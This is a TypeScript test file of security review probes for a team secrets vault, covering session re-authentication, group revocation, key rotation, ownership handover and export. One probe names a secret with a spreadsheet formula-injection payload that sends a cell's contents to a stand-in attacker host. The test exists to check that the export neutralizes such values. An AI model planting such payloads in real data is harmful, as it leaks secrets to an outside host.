import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { Database } from "bun:sqlite";
import { createUser, db, request, type Session } from "./support/harness";
import { accessBody, call, newSecret, newVault, putAccess, resetVaultLimits, setRole, share, unlock, type TestVault } from "./support/vault";
import { registeredMigrationIds, runMigrations } from "../server/migrations";

const { runRotationPass, pauseRotationRunnerForTests, rotationStatus } = await import("../server/vault/rotation");
const { reencryptBatch } = await import("../server/vault/crypto");
const { setVaultQuotaForTests } = await import("../server/vault/service");
const { putGroupMembers, deleteGroup } = await import("../server/team/groups");
const { vaultSharingMigration } = await import("../server/migrations/037_vault_sharing");

/**
 * Independent review probes for Wave 26 (Vault B). Tests marked `test.failing` are open review
 * findings: they assert the behaviour the plan promises and fail on the branch as reviewed. When a
 * finding is fixed, its probe starts passing and bun reports it, so it becomes an ordinary test.
 */

beforeEach(() => resetVaultLimits());
afterEach(() => {
  setVaultQuotaForTests(null);
  pauseRotationRunnerForTests(false);
});

const base = (vaultId: string) => `/vaults/${vaultId}`;
const valuePath = (vault: TestVault, secretId: string, slug: string) => `${base(vault.id)}/secrets/${secretId}/values/${vault.envs[slug]}`;

/** A second signed-in session for the same account (another browser, or a stolen cookie). */
function anotherSession(session: Session): Session {
  const token = Buffer.from(crypto.getRandomValues(new Uint8Array(32))).toString("base64url");
  const csrf = Buffer.from(crypto.getRandomValues(new Uint8Array(32))).toString("base64url");
  const at = new Date().toISOString();
  db.query("INSERT INTO sessions (id, user_id, token_hash, csrf_token, created_at, last_seen_at, expires_at) VALUES (?, ?, ?, ?, ?, ?, ?)")
    .run(crypto.randomUUID(), session.userId, createHash("sha256").update(token).digest("hex"), csrf, at, at, new Date(Date.now() + 86_400_000).toISOString());
  const cookie = `mynotes_session=${token}`;
  return { ...session, cookie, setCookie: cookie, csrf };
}

function group(name: string, members: Session[]) {
  const id = crypto.randomUUID();
  const at = new Date().toISOString();
  db.query("INSERT INTO user_groups (id, name, created_at, updated_at) VALUES (?, ?, ?, ?)").run(id, name, at, at);
  for (const member of members) db.query("INSERT INTO group_members (group_id, user_id, added_at) VALUES (?, ?, ?)").run(id, member.userId, at);
  return id;
}
const groupRevision = (groupId: string) => (db.query("SELECT revision FROM user_groups WHERE id = ?").get(groupId) as { revision: number }).revision;
const generation = (vaultId: string) => (db.query("SELECT current_generation FROM vaults WHERE id = ?").get(vaultId) as { current_generation: number }).current_generation;

describe("review: the protected-environment window is per session (D226)", () => {
  test("a window opened in one session does not open another session of the same person, nor anyone else's", async () => {
    const owner = await createUser("R26 window owner");
    const member = await createUser("R26 window member");
    const vault = await newVault(owner);
    const secret = await newSecret(owner, vault, "PROD_ONLY", { prod: "prod-secret" });
    await share(owner, vault, [{ session: member, levels: { prod: "read" } }]);
    expect((await call(owner, "GET", valuePath(vault, secret.id, "prod"))).body.value.value).toBe("prod-secret");
    // A copied cookie (another session) starts closed.
    const stolen = anotherSession(owner);
    for (const [method, path] of [
      ["GET", valuePath(vault, secret.id, "prod")],
      ["GET", `${valuePath(vault, secret.id, "prod")}/versions/1`],
      ["GET", `${base(vault.id)}/environments/${vault.envs.prod}/export?format=dotenv`]
    ] as const) {
      const response = await call(stolen, method, path);
      expect({ path, status: response.status, code: response.body.code }).toEqual({ path, status: 403, code: "REAUTH_REQUIRED" });
    }
    expect((await call(stolen, "POST", `${base(vault.id)}/reveal`, { cells: [{ secretId: secret.id, envId: vault.envs.prod }] })).body.code).toBe("REAUTH_REQUIRED");
    expect((await call(stolen, "POST", `${base(vault.id)}/environments/${vault.envs.prod}/import`, { entries: [{ name: "X", value: "y" }], dryRun: true })).body.code).toBe("REAUTH_REQUIRED");
    // Another person's session is not opened by the owner's window.
    expect((await call(member, "GET", valuePath(vault, secret.id, "prod"))).body.code).toBe("REAUTH_REQUIRED");
    await unlock(member);
    expect((await call(member, "GET", valuePath(vault, secret.id, "prod"))).body.value.value).toBe("prod-secret");
    expect((await call(anotherSession(member), "GET", valuePath(vault, secret.id, "prod"))).body.code).toBe("REAUTH_REQUIRED");
    // A wrong password never opens the window.
    expect((await call(stolen, "POST", "/reauth", { password: "not the password" })).body.code).toBe("REAUTH_FAILED");
    expect((await call(stolen, "GET", "/reauth")).body.reauthUntil).toBeNull();
    expect((db.query("SELECT COUNT(*) AS count FROM sessions WHERE user_id = ? AND vault_reauth_at IS NOT NULL").get(owner.userId) as { count: number }).count).toBe(1);
  });

  test("FINDING (LOW): the re-authentication limit is per person, so another session of the account can use it up for all of them", async () => {
    const owner = await createUser("R26 reauth limit owner");
    const other = await createUser("R26 reauth limit other");
    const vault = await newVault(owner, undefined, { unlock: false });
    expect(vault.id).toBeTruthy();
    const stolen = anotherSession(owner);
    for (let attempt = 0; attempt < 10; attempt += 1) expect((await call(stolen, "POST", "/reauth", { password: "wrong" })).status).toBe(403);
    // The legitimate session, with the right password, is now refused too (bucket `reauth:<userId>`)…
    expect((await call(owner, "POST", "/reauth", { password: owner.password })).status).toBe(429);
    // …but nobody else is affected: a co-worker cannot lock someone out.
    expect((await call(other, "POST", "/reauth", { password: other.password })).status).toBe(200);
  });
});

describe("review: losing read through a group (D211 §6.6, Wave 26 decision 5)", () => {
  test("removing someone from a group, or deleting the group, takes their reach away at once", async () => {
    const owner = await createUser("R26 group owner");
    const admin = await createUser("R26 group admin");
    const member = await createUser("R26 group member");
    const other = await createUser("R26 group other");
    {
      // The Team routes check the admin role; these service calls take the acting id only.
      const vault = await newVault(owner);
      const secret = await newSecret(owner, vault, "VIA_GROUP", { dev: "dev-v" });
      const groupId = group("R26 readers", [member, other]);
      await share(owner, vault, [], [{ id: groupId, levels: { dev: "read" } }]);
      expect((await call(member, "GET", valuePath(vault, secret.id, "dev"))).body.value.value).toBe("dev-v");
      putGroupMembers(admin.userId, groupId, { userIds: [other.userId], revision: groupRevision(groupId) });
      expect((await call(member, "GET", valuePath(vault, secret.id, "dev"))).status).toBe(404);
      expect((await call(member, "GET", "/vaults")).body.vaults.map((item: { id: string }) => item.id)).not.toContain(vault.id);
      expect((await call(other, "GET", valuePath(vault, secret.id, "dev"))).body.value.value).toBe("dev-v");
      deleteGroup(admin.userId, groupId);
      expect((await call(other, "GET", base(vault.id))).status).toBe(404);
      expect(db.query("SELECT COUNT(*) AS count FROM group_grants WHERE resource_kind = 'vault' AND resource_id = ?").get(vault.id)).toEqual({ count: 0 });
    }
  });

  test.failing("FINDING (MEDIUM): losing read through Team → Groups (removal or group deletion) starts a data-key rotation like any other loss", async () => {
    const owner = await createUser("R26 group rot owner");
    const admin = await createUser("R26 group rot admin");
    const member = await createUser("R26 group rot member");
    {
      const vault = await newVault(owner);
      await newSecret(owner, vault, "ROT_GROUP", { dev: "dev-v" });
      const groupId = group("R26 rot readers", [member]);
      await share(owner, vault, [], [{ id: groupId, levels: { dev: "read" } }]);
      const before = generation(vault.id);
      putGroupMembers(admin.userId, groupId, { userIds: [], revision: groupRevision(groupId) });
      expect(generation(vault.id)).toBeGreaterThan(before);
      expect(db.query("SELECT 1 FROM vault_events WHERE vault_id = ? AND event = 'key.rotate.auto'").get(vault.id)).not.toBeNull();
    }
  });
});

describe("review: data-key rotation interleaved with writes (§3.3)", () => {
  test("two rotations back to back, writes and clears between single-row batches: every read works, then one key is left", async () => {
    pauseRotationRunnerForTests(true);
    const owner = await createUser("R26 interleave owner");
    const vault = await newVault(owner);
    const secrets = [];
    for (let index = 0; index < 4; index += 1) secrets.push(await newSecret(owner, vault, `IL_${index}`, { dev: `d${index}`, staging: `s${index}` }, { comment: `c${index}` }));
    const expected = new Map(secrets.map((secret, index) => [secret.id, { dev: `d${index}`, staging: `s${index}` as string | null }]));
    const readAll = async () => {
      for (const secret of secrets) {
        const want = expected.get(secret.id)!;
        expect((await call(owner, "GET", valuePath(vault, secret.id, "dev"))).body.value?.value).toBe(want.dev);
        const staging = await call(owner, "GET", valuePath(vault, secret.id, "staging"));
        if (want.staging === null) expect(staging.body.code).toBe("VALUE_NOT_SET");
        else expect(staging.body.value?.value).toBe(want.staging);
        expect((await call(owner, "GET", `${valuePath(vault, secret.id, "dev")}/versions/1`)).body.version.value).toBe(`d${secrets.indexOf(secret)}`);
      }
    };
    expect((await call(owner, "POST", `${base(vault.id)}/rotate`, {})).status).toBe(200);
    // One row moves (a crash could stop here), then a write lands on generation 2 and a second rotation starts.
    expect(reencryptBatch(vault.id, 1).moved).toBe(1);
    await readAll();
    const first = secrets[0]!;
    const version = (await call(owner, "GET", valuePath(vault, first.id, "dev"))).body.value.version;
    expect((await call(owner, "PUT", valuePath(vault, first.id, "dev"), { value: "d0-new", expectedVersion: version })).status).toBe(200);
    expected.get(first.id)!.dev = "d0-new";
    expect((await call(owner, "POST", `${base(vault.id)}/rotate`, {})).body.rotation.generation).toBe(3);
    const second = secrets[1]!;
    expect((await call(owner, "DELETE", `${valuePath(vault, second.id, "staging")}?expectedVersion=1`)).status).toBe(200);
    expected.get(second.id)!.staging = null;
    await readAll();
    for (let pass = 0; pass < 200 && !rotationStatus(vault.id).done; pass += 1) {
      reencryptBatch(vault.id, 1);
      runRotationPass(0); // retire whatever is no longer referenced, without moving rows
      await readAll();
    }
    runRotationPass(1);
    expect(rotationStatus(vault.id)).toMatchObject({ generation: 3, pendingRows: 0, activeKeys: 1, done: true });
    await readAll();
    // The comments made the trip too.
    for (const [index, secret] of secrets.entries()) expect((await call(owner, "GET", `${base(vault.id)}/secrets/${secret.id}`)).body.secret.comment).toBe(`c${index}`);
  });
});

describe("review: owners and the billing owner (D214, decision 8)", () => {
  test.failing("FINDING (LOW): when the creator leaves a vault that has another owner, the bytes and the vault count move to the owner who stays", async () => {
    const creator = await createUser("R26 billing creator");
    const heir = await createUser("R26 billing heir");
    const vault = await newVault(creator);
    await newSecret(creator, vault, "BILLED", { dev: "x".repeat(2_000) });
    await share(creator, vault, [{ session: heir, role: "owner" }]);
    expect((await call(creator, "POST", `${base(vault.id)}/leave`, {})).status).toBe(200);
    expect((await call(creator, "GET", base(vault.id))).status).toBe(404);
    // writeVaultAccess moves `owner_id`; leaving (and Team → member access → Remove) does not.
    expect(db.query("SELECT owner_id FROM vaults WHERE id = ?").get(vault.id)).toEqual({ owner_id: heir.userId });
  });

  test.failing("FINDING (LOW): a blocked member cannot be made the vault's owner", async () => {
    const owner = await createUser("R26 blocked owner");
    const blocked = await createUser("R26 blocked member");
    const vault = await newVault(owner);
    await share(owner, vault, [{ session: blocked, levels: { dev: "read" } }]);
    db.query("UPDATE users SET disabled_at = ? WHERE id = ?").run(new Date().toISOString(), blocked.userId);
    try {
      // The owner hands the vault to the blocked account and steps down: nobody can manage it any more.
      // (The new owner is listed first: the other order meets the 500 of the next probe.)
      const response = await putAccess(owner, vault.id, { people: [{ id: blocked.userId, role: "owner", levels: {} }, { id: owner.userId, role: "member", levels: { [vault.envs.dev!]: "admin" } }], groups: [] });
      expect(response.status).toBe(400);
    } finally {
      db.query("UPDATE users SET disabled_at = NULL WHERE id = ?").run(blocked.userId);
    }
  });

  test.failing("FINDING (MEDIUM): an owner hands the vault to a member in one save, in the order the Access page sends (owner row first)", async () => {
    const owner = await createUser("R26 handover owner");
    const heir = await createUser("R26 handover heir");
    const vault = await newVault(owner);
    await share(owner, vault, [{ session: heir, levels: { dev: "read" } }]);
    // The sheet lists people by added_at, so the current owner comes first; the page sends that order.
    const sheet = (await call(owner, "GET", `${base(vault.id)}/access`)).body;
    expect(sheet.people.map((person: { id: string }) => person.id)).toEqual([owner.userId, heir.userId]);
    const response = await putAccess(owner, vault.id, { people: [{ id: owner.userId, role: "member", levels: {} }, { id: heir.userId, role: "owner", levels: {} }], groups: [] });
    // Today: the demotion runs first, 031's vault_keep_one_owner trigger fires, and the uncaught
    // SQLite error is a 500 "Something went wrong" (only DELETE maps LAST_OWNER). With the rows in
    // the other order the write succeeds, but the closing `readVaultAccess(actor, …)` re-authorizes
    // the caller, who is no longer an owner or env admin: 404/403, and the whole handover rolls back.
    expect(response.status).toBe(200);
  });

  test.failing("FINDING (LOW): a member's QUOTA_EXCEEDED does not disclose the creator's stored bytes across all their vaults", async () => {
    const owner = await createUser("R26 quota owner");
    const member = await createUser("R26 quota member");
    const vault = await newVault(owner);
    await newSecret(owner, vault, "OWNER_BYTES", { dev: "x".repeat(5_000) });
    await share(owner, vault, [{ session: member, levels: { dev: "write" } }]);
    setVaultQuotaForTests(1);
    const refused = await call(member, "POST", `${base(vault.id)}/secrets`, { name: "MEMBER", values: { [vault.envs.dev!]: { value: "m" } } });
    expect(refused.body.code).toBe("QUOTA_EXCEEDED");
    expect(refused.body.storedBytes).toBeUndefined();
  });
});

describe("review: export (§6.4, T55)", () => {
  test("the export is an attachment with the content route's headers, a safe file name, and nothing a member cannot read", async () => {
    const owner = await createUser("R26 export owner");
    const member = await createUser("R26 export member");
    const vault = await newVault(owner, "Ünïcode \"quoted\" / name\\ ;x");
    await newSecret(owner, vault, "BOTH", { dev: "dev-v", prod: "prod-v" });
    await share(owner, vault, [{ session: member, levels: { dev: "read" } }]);
    const response = await request(`/vault/vaults/${vault.id}/environments/${vault.envs.dev}/export?format=dotenv`, {}, member);
    expect(response.status).toBe(200);
    expect(response.headers.get("cache-control")).toContain("no-store");
    expect(response.headers.get("x-content-type-options")).toBe("nosniff");
    expect(response.headers.get("content-security-policy")).toContain("sandbox");
    const disposition = response.headers.get("content-disposition") ?? "";
    expect(disposition.startsWith("attachment")).toBe(true);
    expect(disposition).not.toMatch(/[\r\n]/);
    // ASCII only, from the vault's name and the environment's short name.
    expect(disposition).toMatch(/^attachment; filename="[a-z0-9-]+-dev\.env"/);
    const text = await response.text();
    expect(text).toContain("dev-v");
    expect(text).not.toContain("prod-v");
    expect((await request(`/vault/vaults/${vault.id}/environments/${vault.envs.prod}/export?format=dotenv`, {}, member)).status).toBe(404);
    expect((await call(member, "POST", `${base(vault.id)}/environments/${vault.envs.prod}/import`, { entries: [{ name: "X", value: "y" }], dryRun: true })).status).toBe(404);
    expect((await call(member, "POST", `${base(vault.id)}/environments/${vault.envs.dev}/import`, { entries: [{ name: "X", value: "y" }], dryRun: true })).body.code).toBe("VAULT_LEVEL");
  });

  test.failing("FINDING (MEDIUM): a CSV export neutralizes cells a spreadsheet would run as a formula (T55)", async () => {
    const owner = await createUser("R26 csv owner");
    const writer = await createUser("R26 csv writer");
    const vault = await newVault(owner);
    await newSecret(owner, vault, "API_TOKEN", { dev: "tok-123" });
    await share(owner, vault, [{ session: writer, levels: { dev: "write" } }]);
    // Anyone with write on one environment can name a secret; the owner later exports and opens the CSV.
    await newSecret(writer, vault, "=HYPERLINK(\"https://attacker.invalid/?\"&B2,\"open\")", { dev: "@SUM(1+1)" });
    const response = await request(`/vault/vaults/${vault.id}/environments/${vault.envs.dev}/export?format=csv`, {}, owner);
    const lines = (await response.text()).split("\r\n").slice(1).filter(Boolean);
    for (const line of lines) for (const cell of line.split(",")) expect(cell.replace(/^"/, "")).not.toMatch(/^[=+\-@\t\r]/);
  });
});

describe("review: Team → Integrations still creates integrations on this branch", () => {
  test("POST /team/integrations answers 201 with the scroll audit's payload; the vault refuses the integration", async () => {
    const admin = await createUser("R26 integrations admin");
    const owner = await createUser("R26 integrations owner");
    // Left an admin: resetting would trip LAST_ADMIN when this file runs alone.
    setRole(admin, "admin");
    {
      const created = await request("/team/integrations", { method: "POST", body: JSON.stringify({ name: `Scroll bot 1 ${Date.now().toString(36).slice(-5)}`, role: "member", description: "Seeded by the scroll audit" }) }, admin);
      expect(created.status).toBe(201);
      const bot = ((await created.json()) as { integration: { id: string } }).integration.id;
      const vault = await newVault(owner);
      expect((await putAccess(owner, vault.id, accessBody(vault, owner, [{ id: bot, levels: { dev: "read" } }]))).body.code).toBe("INTEGRATION_NOT_ALLOWED");
    }
  });
});

describe("review: migration 037", () => {
  const at = "2026-09-30T00:00:00.000Z";
  function migratedDatabase() {
    const database = new Database(":memory:", { strict: true });
    database.exec("PRAGMA foreign_keys = ON");
    runMigrations(database);
    return database;
  }

  test("backfills stored_bytes on a database that already has vault rows, keeps it in step through triggers, re-runs as a no-op", () => {
    const database = migratedDatabase();
    // Undo 037 so the database looks like 036 with Wave 25 data, then seed and apply it again.
    for (const name of (database.query("SELECT name FROM sqlite_master WHERE type = 'trigger' AND (name LIKE 'vault_%bytes%' OR name = 'vault_members_person_only')").all() as Array<{ name: string }>).map((row) => row.name)) database.exec(`DROP TRIGGER ${name}`);
    database.exec("DELETE FROM schema_migrations WHERE id = 37");
    database.query("INSERT INTO users (id, email, display_name, password_hash, created_at) VALUES ('u1', 'u1@example.test', 'U1', 'x', ?)").run(at);
    database.query("INSERT INTO vaults (id, owner_id, name, created_at, updated_at) VALUES ('v1', 'u1', 'One', ?, ?)").run(at, at);
    database.query("INSERT INTO vault_keys (vault_id, generation, wrapped_dek, created_at) VALUES ('v1', 1, 'v1:a:b:c', ?)").run(at);
    database.query("INSERT INTO vault_members (vault_id, user_id, role, added_at) VALUES ('v1', 'u1', 'owner', ?)").run(at);
    database.query("INSERT INTO vault_environments (id, vault_id, slug, name, position, created_at) VALUES ('e1', 'v1', 'dev', 'Dev', 0, ?)").run(at);
    database.query("INSERT INTO vault_secrets (id, vault_id, name, type, comment_ct, comment_generation, created_at, updated_at) VALUES ('s1', 'v1', 'A', 'value', 'cccc', 1, ?, ?)").run(at, at);
    database.query("INSERT INTO vault_values (secret_id, env_id, value_ct, comment_ct, generation, version, updated_at) VALUES ('s1', 'e1', 'vvvvvvvv', NULL, 1, 2, ?)").run(at);
    database.query("INSERT INTO vault_value_versions (secret_id, env_id, version, value_ct, comment_ct, cleared, generation, created_at) VALUES ('s1', 'e1', 1, NULL, NULL, 1, 1, ?), ('s1', 'e1', 2, 'vvvvvvvv', 'kk', 0, 1, ?)").run(at, at);
    const bytes = () => (database.query("SELECT stored_bytes FROM vaults WHERE id = 'v1'").get() as { stored_bytes: number }).stored_bytes;
    database.exec("UPDATE vaults SET stored_bytes = 0");
    runMigrations(database);
    expect(bytes()).toBe(4 + 8 + 8 + 2);
    // Idempotent: running the migration body again changes nothing.
    database.transaction(() => vaultSharingMigration.up(database))();
    expect(bytes()).toBe(22);
    // Cascades on purge are not counted twice; NULL ciphertext never makes the counter NULL.
    database.exec("DELETE FROM vault_secrets WHERE id = 's1'");
    expect(bytes()).toBe(0);
    database.query("INSERT INTO users (id, email, display_name, password_hash, created_at, kind) VALUES ('bot', 'bot@integration.invalid', 'Bot', '!', ?, 'service')").run(at);
    expect(() => database.query("INSERT INTO vault_members (vault_id, user_id, role, added_at) VALUES ('v1', 'bot', 'member', ?)").run(at)).toThrow("PERSON_ONLY");
    expect(registeredMigrationIds.at(-1)).toBe(37);
    database.close();
  });
});
